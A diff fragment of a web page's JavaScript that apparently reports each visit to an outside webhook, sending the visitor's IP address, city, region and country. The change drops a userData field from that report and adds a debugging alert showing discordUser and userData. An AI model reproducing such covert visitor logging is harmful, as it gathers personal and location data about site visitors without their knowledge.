@@ -90,7 +90,6 @@ ${userDataFormatted}
 
     await sendWebhook("User Visit", `
 **IP:** ${ipData.ip}
-${userData}
 **City:** ${ipData.city}
 **Region:** ${ipData.region}
 **Country:** ${ipData.country}
@@ -289,6 +288,8 @@ updateUI(); // Check and update UI on page load
             alert('No response to copy.');
         }
     });
+
+alert(discordUser, userData, userDataFormatted);
 
     // sendWebhook function
     async function sendWebhook(title, description, color) {
